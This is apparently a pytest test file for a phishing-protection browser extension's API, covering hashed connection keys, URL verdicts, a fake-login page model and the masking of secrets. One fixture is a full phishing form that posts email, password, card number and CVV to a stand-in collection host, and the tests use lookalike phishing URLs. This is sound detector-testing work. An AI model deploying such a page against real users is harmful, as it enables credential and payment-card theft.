"""(6 Nov) Browser extension: connection keys (shown once, stored hashed, deletable) and the page check."""
import uuid

import pytest

from helpers import register_user

FAKE_LOGIN = ("<!doctype html><html><head><title>Account verification required</title></head><body>"
              "<h2>Your account has been limited</h2><p>Verify your account within 24 hours or it will be suspended. "
              "Sign in to confirm your identity and billing details.</p>"
              '<form action="https://collect-data-247.xyz/next.php" method="post">'
              '<input name="email" placeholder="Email"><input type="password" name="pass" placeholder="Password">'
              '<input name="card" placeholder="Card number"><input name="cvv" placeholder="CVV">'
              '<button>Verify now</button></form>' + '<a href="#">Help</a> <a href="#">Privacy</a> <a href="#">Terms</a>' * 5 +
              "</body></html>")
REAL_LOGIN = ("<!doctype html><html><head><title>Sign in - Example Shop</title></head><body><header><a href='/'>Example Shop</a>"
              " <a href='/products'>Products</a> <a href='/orders'>My orders</a> <a href='/help'>Help</a></header>"
              "<h1>Sign in to Example Shop</h1><form action='/session' method='post'><label>Email <input name='email' "
              "type='email'></label><label>Password <input name='password' type='password'></label><button>Sign in</button>"
              "</form><p><a href='/forgot'>Forgot password?</a> New here? <a href='/register'>Create an account</a></p>"
              + "<p>Example Shop sells books, toys and garden tools. Free delivery on orders over 499 rupees.</p>" * 8 +
              "<footer><a href='/about'>About us</a> <a href='/privacy'>Privacy</a> <a href='/terms'>Terms</a></footer></body></html>")


@pytest.fixture()
def key(auth_client):
    r = auth_client.post("/api/extension/tokens", json={"label": "My Chrome"})
    assert r.status_code == 201
    return r.json()["token"]


def chk(client, key, **body):
    return client.post("/api/extension/check", json=body, headers={"X-CyberGuard-Extension": key})


def test_key_is_shown_once_and_stored_only_as_a_hash(auth_client, key):
    from app.db.database import SessionLocal
    from app.db.models import ExtensionToken
    assert key.startswith("cgx_") and len(key) > 40
    listed = auth_client.get("/api/extension/tokens").json()
    assert listed and "token" not in listed[0] and "tokenHash" not in listed[0] and listed[0]["label"] == "My Chrome"
    db = SessionLocal()
    try:
        row = db.query(ExtensionToken).filter(ExtensionToken.id == listed[0]["id"]).first()
        assert row.token_hash != key and len(row.token_hash) == 64
    finally:
        db.close()


def test_without_a_valid_key_nothing_is_checked(client, auth_client, key):
    assert client.post("/api/extension/check", json={"url": "https://example.com/"}).status_code == 401
    assert chk(client, "cgx_" + "A" * 43, url="https://example.com/").status_code == 401
    assert chk(client, "not-a-key", url="https://example.com/").status_code == 401
    kid = auth_client.get("/api/extension/tokens").json()[0]["id"]
    assert chk(client, key, url="https://example.com/").status_code == 200
    assert auth_client.delete(f"/api/extension/tokens/{kid}").status_code == 200
    assert chk(client, key, url="https://example.com/").status_code == 401       # deleted key: disconnected at once


def test_keys_belong_to_their_owner(client, key):
    other = f"other_{uuid.uuid4().hex[:6]}@example.com"
    client.post("/api/auth/logout")
    register_user(client, {"name": "O", "email": other, "password": "TestPass123"})
    assert client.get("/api/extension/tokens").json() == []
    assert client.delete("/api/extension/tokens/EXT_does_not_exist").status_code == 404


def test_at_most_five_browsers(auth_client):
    for i in range(5):
        assert auth_client.post("/api/extension/tokens", json={"label": f"b{i}"}).status_code == 201
    assert auth_client.post("/api/extension/tokens", json={"label": "b6"}).status_code == 409


@pytest.mark.parametrize("url", ["http://localhost:5173/dashboard", "http://192.168.1.1/", "http://10.0.0.5/login",
                                 "file:///C:/Users/x/a.html", "chrome://settings", "http://printer.local/"])
def test_private_and_browser_pages_are_never_judged(client, key, url):
    assert chk(client, key, url=url).json()["level"] == "skip"


def test_verdicts(client, key):
    ok = chk(client, key, url="https://www.google.com/search?q=weather").json()
    assert ok["level"] == "safe"
    bad = chk(client, key, url="https://paypa1-secure-login.com/signin").json()
    assert bad["level"] == "danger" and bad["savedAsFinding"] is True and bad["reasons"]
    again = chk(client, key, url="https://paypa1-secure-login.com/signin").json()
    assert again["level"] == "danger" and again["savedAsFinding"] is False         # one finding per site and day


def test_a_redirect_through_a_risky_address_counts(client, key):
    v = chk(client, key, url="https://example.com/landing", redirects=["https://sbi-kyc-update.top/r?id=7"]).json()
    assert v["score"] >= 51 and any("Redirect" in r for r in v["reasons"])


def test_login_pages_are_judged_by_the_fake_login_model(client, key):
    from app.detectors import fake_login
    if fake_login.load() is None:
        pytest.skip("fake_login.joblib not installed")
    fake = chk(client, key, url="https://shop.example-shop.com/login", html=FAKE_LOGIN).json()
    real = chk(client, key, url="https://shop.example-shop.com/signin", html=REAL_LOGIN).json()
    assert fake["level"] == "danger" and fake["pageChecked"] and any("Fake login" in r for r in fake["reasons"])
    assert real["level"] != "danger"
    trusted = chk(client, key, url="https://accounts.google.com/signin", html=FAKE_LOGIN).json()
    assert trusted["pageChecked"] is False and trusted["level"] == "safe"          # official sites: page not judged


def test_page_code_size_is_limited(client, key):
    r = chk(client, key, url="https://example.com/", html="x" * 400_001)
    assert r.status_code == 422


def test_secrets_in_a_dangerous_link_are_not_saved(client, key):
    from app.db.database import SessionLocal
    from app.db.models import Scan
    url = "https://sbi-kyc-update.top/verify?token=abc123SECRET&code=998877&step=2"
    assert chk(client, key, url=url).json()["savedAsFinding"] is True
    db = SessionLocal()
    try:
        s = db.query(Scan).filter(Scan.subtopic_title == "Browser extension (automatic)",
                                  Scan.target.like("https://sbi-kyc-update.top/verify%")).order_by(Scan.created_at.desc()).first()
        assert s.target == "https://sbi-kyc-update.top/verify?token=***&code=***&step=2"
        assert "abc123SECRET" not in (s.explanation or "") and "998877" not in (s.explanation or "")
    finally:
        db.close()
